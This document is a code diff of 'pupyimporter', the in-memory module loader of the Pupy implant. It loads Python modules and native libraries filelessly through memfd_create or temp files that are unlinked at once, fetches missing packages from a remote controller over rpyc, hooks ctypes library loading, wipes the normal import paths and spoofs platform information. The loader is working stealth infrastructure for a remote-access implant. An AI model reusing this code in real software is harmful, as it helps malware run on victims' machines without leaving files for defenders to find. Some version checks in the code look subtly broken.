@@ -16,26 +16,143 @@
 # This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
 # Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
 #
-import sys, imp, zlib, marshal
+import sys, imp, marshal, gc
 
-__debug = False;
+__debug = False
+__trace = False
+
+modules = {}
+dlls = set()
 
 def dprint(msg):
     global __debug
     if __debug:
         print msg
 
+def memtrace(msg):
+    global __debug
+    global __trace
+    if __debug and __trace:
+        import time
+        import os
+        import cPickle
+        import gc
+
+        msg = msg or 'unknown'
+        msg = msg.replace('/', '_')
+
+        gc.collect()
+        snapshot = __trace.take_snapshot()
+
+        if not os.path.isdir('/tmp/pupy-traces'):
+            os.makedirs('/tmp/pupy-traces')
+
+        with open('/tmp/pupy-traces/{}-{}'.format(time.time(), msg), 'w+b') as out:
+            cPickle.dump(snapshot, out)
+
 try:
     import _memimporter
     builtin_memimporter = True
+    allow_system_packages = False
+
 except ImportError:
     builtin_memimporter = False
+    allow_system_packages = True
+    import ctypes
+    import platform
+    if sys.platform!="win32":
+        libc = ctypes.CDLL(None)
+        syscall = libc.syscall
+    from tempfile import mkstemp
+    from os import chmod, unlink, close, write
 
-modules={}
+    class MemImporter(object):
+        def __init__(self):
+            self.dir = None
+            self.memfd = None
+            self.ready = False
+
+            if platform.system() == 'Linux':
+                maj, min = platform.release().split('.')[:2]
+                if maj >= 3 and min >= 13:
+                    __NR_memfd_create = None
+                    machine = platform.machine()
+                    if machine == 'x86_64':
+                        __NR_memfd_create = 319
+                    elif machine == '__i386__':
+                        __NR_memfd_create = 356
+
+                    if __NR_memfd_create:
+                        self.memfd = lambda: syscall(__NR_memfd_create, 'heap', 0x1)
+                        self.ready = True
+                        return
+
+            for dir in ['/dev/shm', '/tmp', '/var/tmp', '/run']:
+                try:
+                    fd, name = mkstemp(dir=dir)
+                except:
+                    continue
+
+                try:
+                    chmod(name, 0777)
+                    self.dir = dir
+                    self.ready = True
+                    break
+
+                finally:
+                    close(fd)
+                    unlink(name)
+
+        def import_module(self, data, initfuncname, fullname, path):
+            return self.load_library(data, fullname, dlopen=False, initfuncname=initfuncname)
+
+
+        def load_library(self, data, fullname, dlopen=True, initfuncname=None):
+            fd = -1
+            closefd = True
+
+            result = False
+
+            if self.memfd:
+                fd = self.memfd()
+                if fd != -1:
+                    name = '/proc/self/fd/{}'.format(fd)
+                    closefd = False
+
+            if fd == -1:
+                fd, name = mkstemp(dir=self.dir)
+
+            try:
+                write(fd, data)
+                if dlopen:
+                    result = ctypes.CDLL(fullname)
+                else:
+                    if initfuncname:
+                        result = imp.load_dynamic(initfuncname[4:], name)
+                    else:
+                        result = imp.load_dynamic(fullname, name)
+
+            except Exception as e:
+                self.dir = None
+                raise e
+
+            finally:
+                if closefd:
+                    close(fd)
+                    unlink(name)
+
+            return result
+
+    _memimporter = MemImporter()
+    builtin_memimporter = _memimporter.ready
+
+remote_load_package = None
+remote_print_error = None
+
 try:
     import pupy
-    if not (hasattr(pupy, 'pseudo') and pupy.pseudo):
-        modules = marshal.loads(zlib.decompress(pupy._get_compressed_library_string()))
+    if not (hasattr(pupy, 'pseudo') and pupy.pseudo) and not modules:
+        modules = pupy.get_modules()
 except ImportError:
     pass
 
@@ -44,7 +161,7 @@ def get_module_files(fullname):
     global modules
     path = fullname.replace('.','/')
 
-    return [
+    files = [
         module for module in modules.iterkeys() \
         if module.rsplit(".",1)[0] == path or any([
             path+'/__init__'+ext == module for ext in [
@@ -53,17 +170,117 @@ def get_module_files(fullname):
         ])
     ]
 
-def pupy_add_package(pkdic):
+    if len(files) > 1:
+        # If we have more than one file, than throw away dlls
+        files = [ x for x in files if not x.endswith('.dll') ]
+
+    return files
+
+def pupy_add_package(pkdic, compressed=False, name=None):
     """ update the modules dictionary to allow remote imports of new packages """
     import cPickle
+    import zlib
+
     global modules
+
+    if compressed:
+        pkdic = zlib.decompress(pkdic)
 
     module = cPickle.loads(pkdic)
 
-    if __debug:
-        print 'Adding package: {}'.format([ x for x in module.iterkeys() ])
+    dprint('Adding files: {}'.format(module.keys()))
 
     modules.update(module)
+
+    if name:
+        try:
+            __import__(name)
+        except:
+            pass
+
+    gc.collect()
+
+    memtrace(name)
+
+def has_module(name):
+    global modules
+
+    if name in sys.modules or name in modules:
+        return True
+
+    fsname = name.replace('.', '/')
+    fsnames = (
+        '{}.py'.format(fsname),
+        '{}/__init__.py'.format(fsname),
+        '{}.pyd'.format(fsname),
+        '{}.so'.format(fsname)
+    )
+
+    for module in modules:
+        if module.startswith(fsnames):
+            return True
+
+    return False
+
+def has_dll(name):
+    global dlls
+    return name in dlls
+
+def new_modules(names):
+    return [
+        name for name in names if not has_module(name)
+    ]
+
+def new_dlls(names):
+    return [
+        name for name in names if not has_dll(name)
+    ]
+
+def load_dll(name, buf):
+    global dlls
+    if name in dlls:
+        return True
+
+    import pupy
+    if hasattr(pupy, 'load_dll'):
+        if pupy.load_dll(name, buf):
+            dlls.add(name)
+            return True
+
+    return False
+
+def invalidate_module(name):
+    import pupy
+
+    global modules
+    global __debug
+
+    for item in modules.keys():
+        if item == name or item.startswith(name+'.'):
+            dprint('Remove {} from pupyimporter.modules'.format(item))
+            del modules[item]
+
+    for item in sys.modules.keys():
+        if not (item == name or item.startswith(name+'.')):
+            continue
+
+        mid = id(sys.modules[item])
+
+        dprint('Remove {} from sys.modules'.format(item))
+        del sys.modules[item]
+
+        if hasattr(pupy, 'namespace'):
+            dprint('Remove {} from rpyc namespace'.format(item))
+            pupy.namespace.__invalidate__(item)
+
+        if __debug:
+            for obj in gc.get_objects():
+                if id(obj) == mid:
+                    dprint('Module {} still referenced by {}'.format(
+                        item, [ id(x) for x in gc.get_referrers(obj) ]
+                    ))
+
+    gc.collect()
 
 class PupyPackageLoader:
     def __init__(self, fullname, contents, extension, is_pkg, path):
@@ -75,79 +292,105 @@ class PupyPackageLoader:
         self.archive="" #need this attribute
 
     def load_module(self, fullname):
+        global remote_print_error
+
         imp.acquire_lock()
         try:
             dprint('loading module {}'.format(fullname))
             if fullname in sys.modules:
                 return sys.modules[fullname]
+
             mod=None
             c=None
             if self.extension=="py":
                 mod = imp.new_module(fullname)
                 mod.__name__ = fullname
-                mod.__file__ = '<memimport>/{}'.format(self.path)
-                mod.__loader__ = self
+                mod.__file__ = 'pupy://{}'.format(self.path)
                 if self.is_pkg:
                     mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                     mod.__package__ = fullname
                 else:
                     mod.__package__ = fullname.rsplit('.', 1)[0]
-                sys.modules[fullname]=mod
                 code = compile(self.contents, mod.__file__, "exec")
-                exec code in mod.__dict__
+                sys.modules[fullname] = mod
+                exec (code, mod.__dict__)
+
             elif self.extension in ["pyc","pyo"]:
                 mod = imp.new_module(fullname)
                 mod.__name__ = fullname
-                mod.__file__ = '<memimport>/{}'.format(self.path)
-                mod.__loader__ = self
+                mod.__file__ = 'pupy://{}'.format(self.path)
                 if self.is_pkg:
                     mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                     mod.__package__ = fullname
                 else:
                     mod.__package__ = fullname.rsplit('.', 1)[0]
-                sys.modules[fullname]=mod
-                c=marshal.loads(self.contents[8:])
-                exec c in mod.__dict__
-            elif self.extension in ("dll","pyd","so"):
+                sys.modules[fullname] = mod
+                exec (marshal.loads(self.contents[8:]), mod.__dict__)
+
+            elif self.extension in ("dll", "pyd", "so"):
                 initname = "init" + fullname.rsplit(".",1)[-1]
-                path=fullname.replace(".",'/')+"."+self.extension
+                path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                 dprint('Loading {} from memory'.format(fullname))
-                dprint('init:{}, {}.{}'.format(initname,fullname,self.extension))
+                dprint('init={} fullname={} path={}'.format(initname, fullname, path))
                 mod = _memimporter.import_module(self.contents, initname, fullname, path)
-                mod.__name__=fullname
-                mod.__file__ = '<memimport>/{}'.format(self.path)
-                mod.__loader__ = self
-                mod.__package__ = fullname.rsplit('.',1)[0]
-                sys.modules[fullname]=mod
+                if mod:
+                    mod.__name__=fullname
+                    mod.__file__ = 'pupy://{}'.format(self.path)
+                    mod.__package__ = fullname.rsplit('.',1)[0]
+                    sys.modules[fullname] = mod
+
+            try:
+                memtrace(fullname)
+            except Exception, e:
+                dprint('memtrace failed: {}'.format(e))
+
+
         except Exception as e:
             if fullname in sys.modules:
                 del sys.modules[fullname]
+
             import traceback
-            exc_type, exc_value, exc_traceback = sys.exc_info()
-            traceback.print_tb(exc_traceback)
-            dprint('PupyPackageLoader: '
-                       'Error while loading package {} ({}) : {}'.format(
-                           fullname, self.extension, str(e)))
+
+            if remote_print_error:
+                try:
+                    remote_print_error("Error loading package {} ({} pkg={}) : {}".format(
+                        fullname, self.path, self.is_pkg, str(traceback.format_exc())))
+                except:
+                    pass
+            else:
+                dprint('PupyPackageLoader: Error importing %s : %s'%(fullname, traceback.format_exc()))
+
             raise e
+
         finally:
+            self.contents = None
             imp.release_lock()
-        mod = sys.modules[fullname] # reread the module in case it changed itself
-        return mod
+            gc.collect()
 
-class PupyPackageFinder:
-    def __init__(self, modules):
-        self.modules = modules
-        self.modules_list=[
-            x.rsplit(".",1)[0] for x in self.modules.iterkeys()
-        ]
+        return sys.modules[fullname]
 
-    def find_module(self, fullname, path=None):
+class PupyPackageFinderImportError(ImportError):
+    pass
+
+class PupyPackageFinder(object):
+    search_lock = None
+    search_set = set()
+
+    def __init__(self, path=None):
+        if path and not path.startswith('pupy://'):
+            raise PupyPackageFinderImportError()
+
+    def find_module(self, fullname, path=None, second_pass=False):
+        global modules
+        global remote_load_package
+
         imp.acquire_lock()
+        selected = None
+
         try:
             files=[]
             if fullname in ( 'pywintypes', 'pythoncom' ):
-                fullname = fullname + "%d%d" % sys.version_info[:2]
-                fullname = fullname.replace(".", '/') + ".dll"
+                fullname = fullname + '27.dll'
                 files = [ fullname ]
             else:
                 files = get_module_files(fullname)
@@ -155,11 +398,40 @@ class PupyPackageFinder:
             dprint('find_module({},{}) in {})'.format(fullname, path, files))
             if not builtin_memimporter:
                 files = [
-                    f for f in files if not f.lower().endswith((".pyd",".dll",".so"))
+                    f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                 ]
 
             if not files:
-                dprint('{} not found in {} - no files'.format(fullname,path))
+                dprint('{} not found in {}: not in {} files'.format(
+                    fullname, files, len(files)))
+
+                if remote_load_package and not second_pass and not fullname.startswith('exposed_'):
+                    parts = fullname.split('.')[:-1]
+
+                    for i in xrange(len(parts)):
+                        part = '.'.join(parts[:i+1])
+                        if part in modules or part in sys.modules:
+                            return None
+
+                    if not PupyPackageFinder.search_lock is None:
+                        with PupyPackageFinder.search_lock:
+                            if fullname in PupyPackageFinder.search_set:
+                                return None
+                            else:
+                                PupyPackageFinder.search_set.add(fullname)
+
+                    try:
+                        if remote_load_package(fullname):
+                            return self.find_module(fullname, second_pass=True)
+
+                    except Exception as e:
+                        dprint('Exception: {}'.format(e))
+
+                    finally:
+                        if not PupyPackageFinder.search_lock is None:
+                            with PupyPackageFinder.search_lock:
+                                PupyPackageFinder.search_set.remove(fullname)
+
                 return None
 
             criterias = [
@@ -183,45 +455,203 @@ class PupyPackageFinder:
             selected = None
             for criteria in criterias:
                 for pyfile in files:
-                    if criteria(pyfile):
+                    if criteria(pyfile) and pyfile in modules:
                         selected = pyfile
                         break
 
             if not selected:
-                dprint('{} not found in {}: not in {} files'.format(
-                    fullname, selected, len(files)))
+                return None
 
-            dprint('{} found in {}'.format(fullname, selected))
-            content = self.modules[selected]
+            content = modules[selected]
+            dprint('{} found in "{}" / size = {}'.format(fullname, selected, len(content)))
+
             extension = selected.rsplit(".",1)[1].strip().lower()
-            is_pkg = any([selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]])
+            is_pkg = any([
+                selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]
+            ])
 
             dprint('--> Loading {} ({}) package={}'.format(
                 fullname, selected, is_pkg))
+
             return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
+
         except Exception as e:
+            dprint('--> Loading {} failed: {}/{}'.format(fullname, e, type(e)))
+            if 'traceback' in sys.modules:
+                import traceback
+                traceback.print_exc(e)
             raise e
+
         finally:
+            # Don't delete network.conf module
+            if selected and \
+              not selected.startswith(('network/conf', 'pupytasks')) and \
+              selected in modules:
+                dprint('XXX {} remove {} from bundle / count = {}'.format(fullname, selected, len(modules)))
+                del modules[selected]
+
             imp.release_lock()
+            gc.collect()
 
-def load_pywintypes():
-    #loading pywintypes27.dll :-)
-    global modules
+def native_import(name):
+    if not PupyPackageFinder.search_lock is None:
+        with PupyPackageFinder.search_lock:
+            if name in PupyPackageFinder.search_set:
+                return False
+            else:
+                PupyPackageFinder.search_set.add(name)
+
     try:
-        import pupy
-        pupy.load_dll("pywintypes27.dll", modules["pywintypes27.dll"])
-    except Exception as e:
-        dprint('Loading pywintypes27.dll.. failed: {}'.format(e))
-        pass
+        __import__(name)
+        return True
 
-def install(debug=False):
+    except:
+        return False
+
+    finally:
+        if not PupyPackageFinder.search_lock is None:
+            with PupyPackageFinder.search_lock:
+                PupyPackageFinder.search_set.remove(name)
+
+def register_package_request_hook(hook):
+    global remote_load_package
+    remote_load_package = hook
+
+def register_package_error_hook(hook):
+    global remote_print_error
+    import rpyc
+    remote_print_error = rpyc.async(hook)
+
+def unregister_package_error_hook():
+    global remote_print_error
+    remote_print_error = None
+
+def unregister_package_request_hook():
+    global remote_load_package
+    remote_load_package = None
+
+def install(debug=None, trace=False):
     global __debug
-    __debug = debug
-    sys.meta_path.append(PupyPackageFinder(modules))
-    sys.path_importer_cache.clear()
-    if 'win' in sys.platform:
-        load_pywintypes()
-    if __debug:
-        print 'Bundled modules:'
-        for module in modules.iterkeys():
-            print '+ {}'.format(module)
+    global __trace
+    global modules
+
+    if debug:
+       __debug = True
+
+    if trace:
+        __trace = trace
+
+    gc.set_threshold(128)
+
+    if allow_system_packages:
+        sys.path_hooks.append(PupyPackageFinder)
+        sys.path.append('pupy://')
+    else:
+        sys.meta_path = []
+        sys.path = []
+        sys.path_hooks = []
+        sys.path_hooks = [PupyPackageFinder]
+        sys.path.append('pupy://')
+        sys.path_importer_cache.clear()
+
+        import platform
+        platform._syscmd_uname = lambda *args, **kwargs: ''
+        platform.architecture = lambda *args, **kwargs: (
+            '32bit' if pupy.get_arch() == 'x86' else '64bit', ''
+        )
+
+    try:
+        if __trace:
+            __trace = __import__('tracemalloc')
+
+        if __debug and __trace:
+            dprint('tracemalloc enabled')
+            __trace.start(10)
+
+    except Exception, e:
+        dprint('tracemalloc init failed: {}'.format(e))
+        __trace = None
+
+    import ctypes
+    import ctypes.util
+    import os
+    import threading
+
+    PupyPackageFinder.search_lock = threading.Lock()
+
+    ctypes._system_dlopen = ctypes._dlopen
+    ctypes.util._system_find_library = ctypes.util.find_library
+
+    def pupy_make_path(name):
+        if not name:
+            return
+        if 'pupy:' in name:
+            name = name[name.find('pupy:')+5:]
+            name = os.path.relpath(name)
+            name = '/'.join([
+                x for x in name.split(os.path.sep) if x and not x in ( '.', '..' )
+            ])
+
+        return name
+
+    def pupy_find_library(name):
+        pupyized = pupy_make_path(name)
+        if pupyized in modules:
+            dprint("FIND LIBRARY: {} => {}".format(name, pupyized))
+            return pupyized
+        else:
+            return ctypes.util._system_find_library(name)
+
+    def pupy_dlopen(name, *args, **kwargs):
+        dprint("ctypes dlopen: {}".format(name))
+        from_pupy = False
+        name = pupy_make_path(name)
+        dprint("ctypes dlopen / pupyized: {}".format(name))
+
+        if name in modules:
+            if hasattr(_memimporter, 'load_library'):
+                try:
+                    return _memimporter.load_library(modules[name], name)
+                except:
+                    pass
+            elif hasattr(pupy, 'load_dll'):
+                try:
+                    return pupy.load_dll(name, modules[name])
+                except:
+                    pass
+
+        if not from_pupy:
+            return ctypes._system_dlopen(name, *args, **kwargs)
+
+
+    if 'pupy' in sys.modules and hasattr(pupy, 'find_function_address'):
+        ctypes.CDLL_ORIG = ctypes.CDLL
+
+        class PupyCDLL(ctypes.CDLL_ORIG):
+            def __init__(self, name, **kwargs):
+                super(PupyCDLL, self).__init__(name, **kwargs)
+                self._FuncPtr_orig = self._FuncPtr
+                self._FuncPtr = self._find_function_address
+                self._name = pupy_make_path(self._name)
+                dprint('CDLL({})'.format(self._name))
+
+            def _find_function_address(self, search_tuple):
+                name, handle = search_tuple
+                dprint("PupyCDLL._find_function_address: {}".format(name))
+                if not type(name) in (str, unicode):
+                    return self._FuncPtr_orig(search_tuple)
+                else:
+                    addr = pupy.find_function_address(self._name, name)
+                    dprint("PupyCDLL._find_function_address: {} = {}".format(name, addr))
+                    if addr:
+                        return self._FuncPtr_orig(addr)
+                    else:
+                        return self._FuncPtr_orig(search_tuple)
+
+        ctypes.CDLL = PupyCDLL
+
+    ctypes._dlopen = pupy_dlopen
+    ctypes.util.find_library = pupy_find_library
+
+    if sys.platform == 'win32':
+        import pywintypes
